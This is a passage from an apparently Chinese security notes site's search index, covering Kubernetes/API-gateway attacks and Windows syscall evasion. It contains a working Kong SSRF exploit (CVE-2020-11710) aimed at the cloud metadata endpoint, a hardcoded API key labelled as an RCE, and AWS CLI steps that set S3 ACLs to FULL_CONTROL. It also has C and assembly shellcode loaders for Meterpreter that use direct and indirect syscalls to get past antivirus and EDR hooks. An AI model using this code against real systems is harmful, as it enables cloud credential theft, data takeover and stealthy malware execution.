@RandomRobbieBF # # import requests import json import sys import argparse import re import os.path import json from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(InsecureRequestWarning) session = requests.Session() parser = argparse.ArgumentParser() parser.add_argument(\"-u\", \"--url\", required=True,help=\"Kong APi url can be http or https\") parser.add_argument(\"-s\", \"--ssrf\", default=\"http://169.254.169.254\", required=False,help=\"What Internal URL to proxy http:// or https://\") parser.add_argument(\"-p\", \"--proxy\",required=False, help=\"Proxy for debugging\") args = parser.parse_args() url = args.url proxy = args.proxy ssrfurl = args.ssrf if proxy: proxy = args.proxy else: proxy = \"\" http_proxy = proxy proxyDict = { \"http\" : http_proxy, \"https\" : http_proxy, \"ftp\" : http_proxy } def add_service(url): paramsPost = {\"name\":\"metadata-endpoint\",\"url\":\"\"+ssrfurl+\"\"} headers = {\"User-Agent\":\"curl/7.64.1\",\"Connection\":\"close\",\"Accept\":\"*/*\",\"Content-Type\":\"application/x-www-form-urlencoded\"} response = session.post(\"\"+url+\"/services\", data=paramsPost, headers=headers,verify=False, proxies=proxyDict) if response.status_code == 201: print (\"[+] Service Added [+]\") y = json.loads(response.text) try: id = y[\"id\"] return id except: print (\"[-] Error Parsing ID of new service [-]\") sys.exit(0) else: print(\"Error:\\n\\n\"+response.text+\"\") sys.exit(0) def add_route(url,id): paramsPostDict = {\"hosts[]\":\"metadata.local\",\"paths[]\":\"/foo\",\"service.id\":\"\"+id+\"\",\"name\":\"metadata-endpoint\"} paramsPost = \"&\".join(\"%s=%s\" % (k,v) for k,v in paramsPostDict.items()) headers = {\"User-Agent\":\"curl/7.64.1\",\"Connection\":\"close\",\"Accept\":\"*/*\",\"Content-Type\":\"application/x-www-form-urlencoded\"} response = session.post(\"\"+url+\"/routes/\", data=paramsPost, headers=headers,verify=False, proxies=proxyDict) if response.status_code == 201: print (\"[+] Route Added [+]\") y = json.loads(response.text) rid = y[\"id\"] t = url.replace(\":8001\",\"\") print(\"\\n[+] Testing Kong for Metadata Proxy\") cmd = ('curl '+t+'/foo/ -H \"Host: metadata.local\" -H \"Metadata: true\" -H \"Metadata-Flavor: Google\"') print(cmd) os.system(cmd) print (\"\\n\\n[+] To remove added routes and services do the following\") print(\"curl -iX DELETE \"+url+\"/routes/metadata-endpoint\") print(\"curl -iX DELETE \"+url+\"/services/metadata-endpoint\") else: print(\"Error:\\n\\n\"+response.text+\"\") sys.exit(0) id = add_service(url) add_route(url,id)","title":"CVE-2020-11710"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#apache-apisix","text":"\u9ed8\u8ba4\u7aef\u53e39000\uff0c\u6307\u7eb9\u76f4\u63a5/apisix","title":"Apache APISIX"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#apikeyrce","text":"\u6dfb\u52a0\u4e00\u4e2ahttp\u5934\uff1aX-API-KEY: edd1c9f034335f136f87ad84b625c8f1","title":"APIKEY\u786c\u7f16\u7801RCE"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#_20","text":"\u7f51\u4e0a\u641c \u5c1d\u8bd5\u5217\u51fa\u5bf9\u8c61 aws s3 ls s3://xxxx/duixiang \u5c1d\u8bd5\u8bfb\u53d6\u5bf9\u8c61ACL aws s3api get-object-acl --bucket xxxx--key duixiang \u5c1d\u8bd5\u4fee\u6539\u5bf9\u8c61ACL \u6839\u636e\u67e5\u770b\u7684\u7ed3\u679c\uff0c\u4fee\u6539\u4e0b\u9762\u7684\u5c5e\u6027\u7136\u540e\u4fdd\u5b58\u4e3ajson \"Permission\": \"FULL_CONTROL\" aws s3api put-object-acl --bucket xxxx--key duixiang--access-control-policy file://acl.json \u5c1d\u8bd5\u5217\u51fa\u6876 aws s3api list-objects --bucket xxxx \u67e5\u770b\u6876\u7684ACL aws s3api get-bucket-acl --bucket xxxx \u5c1d\u8bd5\u4fee\u6539\u6876ACL aws s3api put-bucket-acl --bucket xxxx --access-control-policy file://acl.json \u6839\u636e\u67e5\u770b\u7684\u7ed3\u679c\uff0c\u4fee\u6539\u4e0b\u9762\u7684\u5c5e\u6027\u7136\u540e\u4fdd\u5b58\u4e3ajson \"Permission\": \"FULL_CONTROL\" aws s3api get-bucket-policy --bucket xxxx --output text | python3 -m json.tool","title":"\u5176\u4ed6\u6f0f\u6d1e"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/","text":"# 2023-10-17 SYSCALL https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/ Windows\u73af\u5b89\u5168\u4f53\u7cfb Ring0\u548cRing3\u5206\u522b\u4ee3\u8868\u5185\u6838\u5c42\u548c\u7528\u6237\u5c42 Windows API Windows\u63d0\u4f9b\u7ed9\u4f7f\u7528\u8005\u7684\u5404\u79cd\u63a5\u53e3\uff0c\u5bf9\u5e94\u7684DLL\u4e00\u822c\u662f User32.dll Kernel32.dll Advapi.dll \u8fd9\u4e9b\u63a5\u53e3\u7684Windows API\u662f\u4e0d\u5e26\u524d\u7f00\u7684 Native API \u66f4\u4f4e\u7ea7\u7684\u63a5\u53e3\uff0c\u539f\u751fAPI\u3002\u53ef\u4ee5\u76f4\u63a5\u5bf9\u7cfb\u7edf\u5c42\u8fdb\u884c\u64cd\u4f5c\uff0c\u8fd9\u4e9b\u51fd\u6570\u5e26\u6709\u524d\u7f00Nt\u3001Zw\uff0c\u4f8b\u5982 NtCreateFile NtWriteVirtualMemory ZwCreateFile \u5bf9\u5e94\u7684DLL\u662f ntdll.dll win32u.dll syscall Native API\u7684syscall\u662fsyscall stub\u7684\u4e00\u90e8\u5206\uff0c syscall stub\u662f\u4e00\u7ec4\u6c47\u7f16\u6307\u4ee4\uff0c\u5bf9\u4e8e\u4e0d\u540cNative API\u7684syscall stub\uff0c\u79fb\u52a8\u5230eax\u7684\u5bc4\u5b58\u5668\uff0c\u4f1a\u6709\u7740\u4e0d\u540c\u7684SSN\uff08\u7cfb\u7edf\u670d\u52a1\u7f16\u53f7\uff09 \u4e5f\u53ef\u4ee5\u8bf4\u662f\u7528\u6237\u5c42\u5230\u7cfb\u7edf\u5c42\u7684\u6865\u6881 SSDT(\u7cfb\u7edf\u670d\u52a1\u63cf\u8ff0\u8868) KiSystemCall \u7528\u4e8e\u6839\u636eSSN\u5728SSDT\u4e2d\u67e5\u627e\u5bf9\u5e94\u7684\u7cfb\u7edf\u51fd\u6570\u4ee3\u7801 Hook \u5185\u8054API hook Inline API Hooking \u5927\u591a\u6570\u6740\u6bd2\u3001EDR\u4f1a\u91c7\u7528\u7684hook\u65b9\u5f0f\uff0c\u5728\u539f\u751fAPI\u6267\u884csyscall\u4e4b\u524d\u5c06\u5176\u91cd\u5b9a\u5411\u81f3\u6740\u6bd2 IAT\u5bfc\u5165\u5730\u5740\u8868hook Import Address Table (IAT) Hooking SSDT hook SSDT Hooking (Windows Kernel) \u5728\u5185\u6838\u5c42\u7684hook\u65b9\u5f0f\uff0c\u5728windows\u5f15\u5165KPP\uff08Kernel Patch Protection\uff09\u4fdd\u62a4\u540e\u7981\u6b62\u4e86\u8fd9\u79cd\u6280\u672f \u91cd\u8981\u7684\u662f \u53cd\u75c5\u6bd2\u8f6f\u4ef6\u4f1a\u5728\u4e0d\u540c\u7684dll\u4e2dhook\u4e0d\u540c\u7684API \u53cd\u75c5\u6bd2\u8f6f\u4ef6\u4e0d\u53ef\u80fdhook\u6240\u6709API\uff0c\u8fd9\u5bf9\u7cfb\u7edf\u7684\u6027\u80fd\u6709\u6240\u5f71\u54cd \u76f4\u63a5syscall \u76f4\u63a5\u7cfb\u7edf\u8c03\u7528\u662f\u4e0d\u4f9d\u8d56\u7cfb\u7edf\u5b58\u6839\u7684syscall\uff0c\u800c\u662f\u81ea\u5df1\u5199\u6c47\u7f16\u6307\u4ee4\u53bbsyscall \u95f4\u63a5syscall \u95f4\u63a5syscall\u662f\u76f4\u63a5\u6267\u884c\u5230syscall\u524d\u4e00\u6b65\uff0c\u518d\u4f7f\u7528\u51fd\u6570\u539f\u672c\u7684syscall\u7ee7\u7eed\u6267\u884c\uff0c\u4f2a\u88c5\u6b63\u5e38\u7a0b\u5e8f\u3002 UINT_PTR sysAddrNtAllocateVirtualMemory; //\u5b9a\u4e49syscall\u6307\u9488\u7c7b\u578b int main() { //\u627e\u5230NtAllocateVirtualMemory\u51fd\u6570\u7684\u5730\u5740 UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, \"NtAllocateVirtualMemory\"); //\u7531\u4e8eNtAllocateVirtualMemory\u51fd\u6570\u540e\u768412\u4e2a\u5b57\u8282\u4fbf\u662fsyscall\u6307\u4ee4\uff0cpNtAllocateVirtualMemory+0x12\u53ef\u8ba1\u7b97\u51fasyscall\u6307\u4ee4\u7684\u4f4d\u7f6e\uff0c\u8fd9\u5c31\u662f\u4e0e\u76f4\u63a5syscall\u4e0d\u540c\u7684\u5730\u65b9\u2014\u2014\u76f4\u63a5syscall\u662f\u76f4\u63a5\u5199\u6c47\u7f16\u624b\u52a8syscall\uff0c\u8fd9\u91cc\u662f\u627e\u5230\u7cfb\u7edf\u672c\u8eab\u7684syscall\u5730\u5740\u7528\u7cfb\u7edf\u7684syscall\u3002\u5f97\u5230sysAddrNtAllocateVirtualMemory\u540e\u653e\u5165asm\u4e2d sysAddrNtAllocateVirtualMemory = pNtAllocateVirtualMemory + 0x12; EXTERN sysAddrNtAllocateVirtualMemory:QWORD ; The actual address of the NtAllocateVirtualMemory syscall in ntdll.dll. .CODE ; Start the code section NtAllocateVirtualMemory PROC mov r10, rcx ; Move the contents of rcx to r10. This is necessary because the syscall instruction in 64-bit Windows expects the parameters to be in the r10 and rdx registers. mov eax, 18h ; Move the syscall number into the eax register. jmp QWORD PTR [sysAddrNtAllocateVirtualMemory] ; Jump to the actual syscall. NtAllocateVirtualMemory ENDP ; End of the procedure. END ; End of the module \u7ec3\u4e60 \u8c03\u8bd5\u8fdb\u7a0b\uff0c\u627e\u5230\u6307\u5b9a\u51fd\u6570SSN \u627e\u5230\u51fd\u6570\u7684SSN NtAllocateVirtualMemory \u4f7f\u7528 x \u67e5\u8be2\u5185\u5b58\u5730\u5740\uff0c\u4f7f\u7528 u \u67e5\u8be2\u51fd\u6570\u7684syscall \u5148\u7528 x \u67e5 ntdll \u4e2d\u7684 NtAllocateVirtualMemory \u5185\u5b58\u5730\u5740\uff0c\u5728\u7528 u \u67e5\u5185\u5b58\u5730\u574000007ffe`9794f040d\u7684syscall\uff0ceax\u540e\u9762\u7684\u7f16\u53f7\u5c31\u662fSSN 0:015> x ntdll!NtAllocateVirtualMemory 00007ffe`9794f040 ntdll!NtAllocateVirtualMemory (NtAllocateVirtualMemory) 0:015> u 00007ffe`9794f040 ntdll!NtAllocateVirtualMemory: 00007ffe`9794f040 4c8bd1 mov r10,rcx 00007ffe`9794f043 b818000000 mov eax,18h 00007ffe`9794f048 f604250803fe7f01 test byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1 00007ffe`9794f050 7503 jne ntdll!NtAllocateVirtualMemory+0x15 (00007ffe`9794f055) 00007ffe`9794f052 0f05 syscall 00007ffe`9794f054 c3 ret 00007ffe`9794f055 cd2e int 2Eh 00007ffe`9794f057 c3 ret \u76f4\u63a5\u7528 u \u6307\u5b9a\u67e5\u51fd\u6570\u7684syscall 0:015> u NtWriteVirtualMemory ntdll!NtWriteVirtualMemory: 00007ffe`9794f480 4c8bd1 mov r10,rcx 00007ffe`9794f483 b83a000000 mov eax,3Ah 00007ffe`9794f488 f604250803fe7f01 test byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1 00007ffe`9794f490 7503 jne ntdll!NtWriteVirtualMemory+0x15 (00007ffe`9794f495) 00007ffe`9794f492 0f05 syscall 00007ffe`9794f494 c3 ret 00007ffe`9794f495 cd2e int 2Eh 00007ffe`9794f497 c3 ret procmon\u67e5\u770bWriteFile\u7684\u6d41\u7a0b \u901a\u8fc7\u8fc7\u6ee4\u8fdb\u7a0b\u548c WriteFile \u64cd\u4f5c\uff0c\u53ef\u4ee5\u770b\u5230notepad\u8fdb\u7a0b\u4ece\u7528\u6237\u6a21\u5f0f\u5230\u7cfb\u7edf\u5c42\u6700\u540e\u8bbf\u95ee\u78c1\u76d8\u7684\u6d41\u7a0b \u4f7f\u7528Windows API\u6267\u884cshellcode\u5e76\u52a8\u6001\u8c03\u8bd5 \u7b80\u5355\u52a0\u8f7d\u5668 #include <stdio.h> #include <windows.h> // Define the thread function for executing shellcode // This function will be executed in a separate thread created later in the main function DWORD WINAPI ExecuteShellcode(LPVOID lpParam) { // Create a function pointer called 'shellcode' and initialize it with the address of the shellcode void (*shellcode)() = (void (*)())lpParam; // Call the shellcode function using the function pointer shellcode(); return 0; } int main() { // Insert the Meterpreter shellcode unsigned char code[] = \"\\xfc....\"; void* exec = VirtualAlloc(0, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE); SIZE_T bytesWritten; WriteProcessMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten); HANDLE hThread = CreateThread(NULL, 0, ExecuteShellcode, exec, 0, NULL); // This ensures the main thread doesn't exit before the shellcode has finished running WaitForSingleObject(hThread, INFINITE); // Return 0 as the main function exit code return 0; } \u5728\u7b26\u53f7\u5904\u53ef\u4ee5\u770b\u5230\u5bfc\u5165\u7684windows api \u70b9\u51fb\u8f6c\u5165\u5bfc\u5165\u5730\u5740\u53ef\u4ee5\u67e5\u770b\u5bf9\u5e94\u6c47\u7f16\u4ee3\u7801 \u518d\u7ee7\u7eed\u8df3\u8f6c\uff0c\u6765\u5230\u4e86\u5bf9\u5e94\u7684\u539f\u751fAPI \u7ee7\u7eed\u8df3\u8f6c\uff0c\u53ef\u4ee5\u770b\u5230\u539f\u751fAPI\u5bf9\u5e94\u7684syscall \u5982\u679c\u5728 WriteProcessMemory \u5904\u4e0b\u65ad\u70b9\uff0c\u7ee7\u7eed\u8fd0\u884c\u7a0b\u5e8f\uff0c\u5728\u7b2cR8\u53ef\u4ee5\u627e\u5230shellcode\u7684\u5185\u5b58\u4f4d\u7f6e \u4f7f\u7528\u539f\u751fAPI\u6267\u884cshellcode\u5e76\u52a8\u6001\u8c03\u8bd5 \u5b9a\u4e49\u6307\u9488\u7c7b\u578b\u51fd\u6570 VirtualAlloc \u5bf9\u5e94\u7684\u539f\u751f\u51fd\u6570 NtAllocateVirtualMemory WriteProcessMemory \u5bf9\u5e94\u7684\u539f\u751f\u51fd\u6570 NtWriteVirtualMemory CreateThread \u5bf9\u5e94\u7684\u539f\u751f\u51fd\u6570 NtCreateThreadEx WaitForSingleObject \u5bf9\u5e94\u7684\u539f\u751f\u51fd\u6570 NtWaitForSingleObject \u5982\u679c\u8981\u627e\u54ea\u4e2aWindows API\u5bf9\u5e94\u7684\u54ea\u4e2a\u539f\u751f\u51fd\u6570\uff0c\u53ef\u4ee5\u4f7f\u7528\u52a8\u6001\u8c03\u8bd5\u53bb\u627e \u5b9a\u4e49\u6307\u9488\u7c7b\u578b\u51fd\u6570 typedef NTSTATUS(WINAPI* PNTALLOCATEVIRTUALMEMORY)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG); typedef NTSTATUS(NTAPI* PNTWRITEVIRTUALMEMORY)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T); typedef NTSTATUS(NTAPI* PNTCREATETHREADEX)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID); typedef NTSTATUS(NTAPI* PNTWAITFORSINGLEOBJECT)(HANDLE, BOOLEAN, PLARGE_INTEGER); \u83b7\u53d6\u539f\u751f\u51fd\u6570\u7684\u5185\u5b58\u5730\u5740 \u6253\u5f00 ntdll.dll \u7684\u53e5\u67c4\uff0c\u901a\u8fc7\u539f\u751f\u51fd\u6570\u7684\u540d\u79f0\u53bb\u5728\u5185\u5b58\u4e2d\u67e5\u627e\u5730\u5740 PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory = (PNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtAllocateVirtualMemory\"); PNTWRITEVIRTUALMEMORY NtWriteVirtualMemory = (PNTWRITEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtWriteVirtualMemory\"); PNTCREATETHREADEX NtCreateThreadEx = (PNTCREATETHREADEX)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtCreateThreadEx\"); PNTWAITFORSINGLEOBJECT NtWaitForSingleObject = (PNTWAITFORSINGLEOBJECT)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtWaitForSingleObject\"); #include <stdio.h> #include <windows.h> // Define typedefs for function pointers to the native API functions we'll be using. // These match the function signatures of the respective functions. typedef NTSTATUS(WINAPI* PNTALLOCATEVIRTUALMEMORY)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG); typedef NTSTATUS(NTAPI* PNTWRITEVIRTUALMEMORY)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T); typedef NTSTATUS(NTAPI* PNTCREATETHREADEX)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID); typedef NTSTATUS(NTAPI* PNTWAITFORSINGLEOBJECT)(HANDLE, BOOLEAN, PLARGE_INTEGER); int main() { // Insert Meterpreter shellcode here. unsigned char code[] = \"\"; // Here we load the native API functions from ntdll.dll using GetProcAddress, which retrieves the address of an exported function // or variable from the specified dynamic-link library (DLL). The return value is then cast to the appropriate function pointer typedef. PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory = (PNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtAllocateVirtualMemory\"); PNTWRITEVIRTUALMEMORY NtWriteVirtualMemory = (PNTWRITEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtWriteVirtualMemory\"); PNTCREATETHREADEX NtCreateThreadEx = (PNTCREATETHREADEX)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtCreateThreadEx\"); PNTWAITFORSINGLEOBJECT NtWaitForSingleObject = (PNTWAITFORSINGLEOBJECT)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtWaitForSingleObject\"); // Allocate a region of virtual memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode. // 'exec' will hold the base address of the allocated memory region. void* exec = NULL; SIZE_T size = sizeof(code); NtAllocateVirtualMemory(GetCurrentProcess(), &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); // Copy the shellcode into the allocated memory region. SIZE_T bytesWritten; NtWriteVirtualMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten); // Execute the shellcode in memory using a new thread. HANDLE hThread; NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), exec, exec, FALSE, 0, 0, 0, NULL); // Wait for the thread to finish executing. NtWaitForSingleObject(hThread, FALSE, NULL); return 0; } \u4f7f\u7528\u76f4\u63a5syscall\u6267\u884cshellcode\u5e76\u52a8\u6001\u8c03\u8bd5 \u5b9a\u4e49\u539f\u751f\u51fd\u6570\u7684\u7ed3\u6784\u4f53 \u65b0\u5efa\u4e00\u4e2a\u5934\u6587\u4ef6\uff0c\u5b9a\u4e49\u9700\u8981\u4f7f\u7528\u7684\u539f\u751f\u51fd\u6570\u7684\u7ed3\u6784\u4f53 #ifndef _SYSCALLS_H // If _SYSCALLS_H is not defined then define it and the contents below. This is to prevent double inclusion. #define _SYSCALLS_H // Define _SYSCALLS_H #include <windows.h> // Include the Windows API header // The type NTSTATUS is typically defined in the Windows headers as a long. typedef long NTSTATUS; // Define NTSTATUS as a long typedef NTSTATUS* PNTSTATUS; // Define a pointer to NTSTATUS // Declare the function prototype for NtAllocateVirtualMemory extern NTSTATUS NtAllocateVirtualMemory( HANDLE ProcessHandle, // Handle to the process in which to allocate the memory PVOID* BaseAddress, // Pointer to the base address ULONG_PTR ZeroBits, // Number of high-order address bits that must be zero in the base address of the section view PSIZE_T RegionSize, // Pointer to the size of the region ULONG AllocationType, // Type of allocation ULONG Protect // Memory protection for the region of pages ); // Declare the function prototype for NtWriteVirtualMemory extern NTSTATUS NtWriteVirtualMemory( HANDLE ProcessHandle, // Handle to the process in which to write the memory PVOID BaseAddress, // Pointer to the base address PVOID Buffer, // Buffer containing data to be written SIZE_T NumberOfBytesToWrite, // Number of bytes to be written PULONG NumberOfBytesWritten // Pointer to the variable that receives the number of bytes written ); // Declare the function prototype for NtCreateThreadEx extern NTSTATUS NtCreateThreadEx( PHANDLE ThreadHandle, // Pointer to a variable that receives a handle to the new thread ACCESS_MASK DesiredAccess, // Desired access to the thread PVOID ObjectAttributes, // Pointer to an OBJECT_ATTRIBUTES structure that specifies the object's attributes HANDLE ProcessHandle, // Handle to the process in which the thread is to be created PVOID lpStartAddress, // Pointer to the application-defined function of type LPTHREAD_START_ROUTINE to be executed by the thread PVOID lpParameter, // Pointer to a variable to be passed to the thread ULONG Flags, // Flags that control the creation of the thread SIZE_T StackZeroBits, // A pointer to a variable that specifies the number of high-order address bits that must be zero in the stack pointer SIZE_T SizeOfStackCommit, // The size of the stack that must be committed at thread creation SIZE_T SizeOfStackReserve, // The size of the stack that must be reserved at thread creation PVOID lpBytesBuffer // Pointer to a variable that receives any output data from the system ); // Declare the function prototype for NtWaitForSingleObject extern NTSTATUS NtWaitForSingleObject( HANDLE Handle, // Handle to the object to be waited on BOOLEAN Alertable, // If set to TRUE, the function returns when the system queues an I/O completion routine or APC for the thread PLARGE_INTEGER Timeout // Pointer to a LARGE_INTEGER that specifies the absolute or relative time at which the function should return, regardless of the state of the object ); #endif // _SYSCALLS_H // End of the _SYSCALLS_H definition \u5b9a\u4e49\u539f\u751f\u51fd\u6570\u7684syscall\u8fc7\u7a0b .CODE ; Start the code section ; Procedure for the NtAllocateVirtualMemory syscall NtAllocateVirtualMemory PROC mov r10, rcx ; Move the contents of rcx to r10. This is necessary because the syscall instruction in 64-bit Windows expects the parameters to be in the r10 and rdx registers. mov eax, 18h ; Move the syscall number into the eax register. syscall ; Execute syscall. ret ; Return from the procedure. NtAllocateVirtualMemory ENDP ; End of the procedure. ; Similar procedures for NtWriteVirtualMemory syscalls NtWriteVirtualMemory PROC mov r10, rcx mov eax, 3Ah syscall ret NtWriteVirtualMemory ENDP ; Similar procedures for NtCreateThreadEx syscalls NtCreateThreadEx PROC mov r10, rcx mov eax, 0C2h syscall ret NtCreateThreadEx ENDP ; Similar procedures for NtWaitForSingleObject syscalls NtWaitForSingleObject PROC mov r10, rcx mov eax, 4 syscall ret NtWaitForSingleObject ENDP END ; End of the module \u8fd0\u884c\u8d77\u6765\u540e\u5728\u52a0\u8f7d\u51fd\u6570\u4e2d\u6ca1\u6709\u51e0\u4e2a\u91cd\u8981\u51fd\u6570 \u4f7f\u7528\u95f4\u63a5syscall\u6267\u884cshellcode\u5e76\u52a8\u6001\u8c03\u8bd5 \u6d41\u7a0b - \u83b7\u53d6ntdll.dll\u7684\u53e5\u67c4 - \u521d\u59cb\u5316\u539f\u751f\u51fd\u6570\u6307\u9488\u5730\u5740 - \u5b9a\u4e49\u8981\u4f7f\u7528\u7684\u51fd\u6570\u7ed3\u6784\u4f53 - \u5b9a\u4e49\u8981\u4f7f\u7528\u7684\u539f\u751f\u51fd\u6570\u7684syscall\u7684\u5730\u5740\u6307\u9488\uff0c\u5e76\u8bbe\u7f6e\u4ecentdll\u4e2d\u83b7\u53d6\u5230\u7684\u51fd\u6570\u6307\u9488\u5730\u5740\uff0c0x12\u7684\u504f\u79fb\u91cf\u3002\u8fd9\u662f\u56e0\u4e3a\u8981\u83b7\u53d6\u51fd\u6570\u521d\u59cb\u5730\u5740\u5230syscall\u7684\u5730\u5740\uff0c\u8fd9\u4e5f\u662f\u95f4\u63a5syscall\u7684\u6838\u5fc3\u2014\u2014\u2014\u2014\u7ed5\u8fc7Win32 API\u5230\u627e\u539f\u751fAPI\u7684\u8fc7\u7a0b\uff0c\u53bb\u8c03\u7528\u51fd\u6570\u539f\u672c\u7684syscall\uff0c\u76f4\u63a5syscall\u5219\u662f\u65e2\u7ed5\u8fc7Win32 API\u5230\u627e\u539f\u751fAPI\uff0c\u53c8\u7ed5\u8fc7\u51fd\u6570\u539f\u751f\u7684syscall\u3002 syscall\u7ed5\u8fc7\u7684\u7f3a\u9677 \u7531\u4e8e\u56fa\u5b9a\u4e86syscall\u7684\u8c03\u7528\u4ee3\u7801\uff0c\u6c47\u7f16\u6307\u4ee4\u7684\u7279\u5f81\u4f1a\u88ab\u9759\u6001\u76d1\u6d4b\u5230\u3002 \u5b9e\u73b0\u7ed5\u8fc7\u6740\u8f6f\u9664\u4e86\u4f7f\u7528syscall\u5916\uff0c\u8fd8\u9700\u8981\u89e3\u51b3\u5176\u4ed6\u7684\u95ee\u9898\u6bd4\u5982\u5176\u4ed6api hook\u95ee\u9898\u3001shellcode\u5185\u5b58\u5206\u914d\u95ee\u9898\u3001\u5168\u6808\u884c\u4e3a\u5f02\u5e38\u95ee\u9898\u3002\u7b80\u5355\u8bf4\u662f\u9700\u8981\u7ed3\u5408\u5404\u79cd\u624b\u6bb5\u6a21\u62df\u51fa\u771f\u5b9e\u7684\u7a0b\u5e8f\u8fd0\u884c\u7684\u5185\u5b58\u8c03\u7528\uff0c\u4ee5\u8fbe\u6210\u6700\u597d\u7684\u514d\u6740\u6548\u679c\u3002 \u6c47\u7f16 \u8bed\u6cd5\u98ce\u683c \u6839\u636e\u8bed\u6cd5\u98ce\u683c\u5206\u6210Intel\u548cAT&T\uff0cWindows\u7528\u7684\u662fInter Inter\u548cAT&T\u533a\u522b\u5982\u4e0b - Inter\u8bed\u6cd5\u662f <\u6307\u4ee4 \u76ee\u6807,\u6e90>\uff1bAT&T\u8bed\u6cd5\u662f<\u6307\u4ee4 \u6e90;\u76ee\u6807> - AT&T\u8bed\u6cd5\u5728\u6ce8\u518c\u540d\u79f0\u4e4b\u524d\u5fc5\u987b\u5199\u767e\u5206\u53f7(%)\uff0c\u6570\u5b57\u4e4b\u524d\u5199\u7f8e\u5143\u53f7($)\u3002\u5730\u5740\u4f7f\u7528\u5706\u62ec\u53f7\u3002 - AT&T\u8bed\u6cd5\u5728\u6307\u4ee4\u4e2d\u6dfb\u52a0\u540e\u7f00\u6765\u5b9a\u4e49\u64cd\u4f5c\u6570\u7684\u5927\u5c0f q - quad 64bits 8bytes l - long 32bits 4bytes w - word 16bits 2bytes b - byte 8bits 1bytes \u51fd\u6570\u7684\u6d41\u7a0b \u6c47\u7f16\u4e2d\u7684\u51fd\u6570\u7279\u5f81\u975e\u5e38\u660e\u663e\uff0c\u5f04\u6e05\u9664\u51fd\u6570\u7684\u529f\u80fd\u662f\u975e\u5e38\u5173\u952e\u7684 1. \u8c03\u7528\u8005\u5c06\u88ab\u8c03\u51fd\u6570\u6240\u9700\u7684\u53c2\u6570\u653e\u5165\u6307\u5b9a\u4f4d\u7f6e\uff0c\u6839\u636e\u8c03\u7528\u7ea6\u5b9a\u4e0d\u540c\uff0c\u4f4d\u7f6e\u4e0d\u540c\uff0c\u6709\u7684\u653e\u5165\u5bc4\u5b58\u5668\uff0c\u6709\u7684\u5168\u653e\u5165\u6808 2. CALL\u6307\u4ee4\u8df3\u8f6c\u5230\u6307\u5b9a\u51fd\u6570 3. \u88ab\u8c03\u51fd\u6570\u914d\u7f6e\u4e00\u4e2a\u6307\u9488\u7528\u6765\u4fdd\u5b58\u4fdd\u6301\u4e0d\u53d8\u7684\u5bc4\u5b58\u5668\u503c 4. \u4e3a\u88ab\u8c03\u51fd\u6570\u5c40\u90e8\u53d8\u91cf\u5728\u6808\u4e0a\u5206\u914d\u7a7a\u95f4\uff0cPUSH\u6307\u4ee4 5. \u88ab\u8c03\u51fd\u6570\u6267\u884c\u8fc7\u7a0b\uff0c\u8bbf\u95ee\u53c2\u5bc4\u5b58\u5668\u7684\u53c2\u6570\uff0c\u5e76\u7ed9\u5bc4\u5b58\u5668\u8fd4\u56de\u7ed3\u679c 6. \u88ab\u8c03\u51fd\u6570\u6267\u884c\u5b8c\u6210\u540e\uff0c\u91ca\u653e\u6808\u7a7a\u95f4\uff0cPOP\u6307\u4ee4 7. \u8fd8\u539f\u7b2c3\u6b65\u4e2d\u7684\u503c 8. \u51fd\u6570\u8fd4\u56de\uff0cRET\u6307\u4ee4 9. \u8c03\u7528\u8005\u8fd8\u539f\u5bc4\u5b58\u5668\u7684\u503c 3-4\u5c5e\u4e8e\u51fd\u6570\u5e8f\u8a00 6-8\u5c5e\u4e8e\u51fd\u6570\u5c3e\u58f0 \u51fd\u6570\u5e8f\u8a00\u548c\u5c3e\u58f0 \u51fd\u6570\u5e8f\u8a00(function 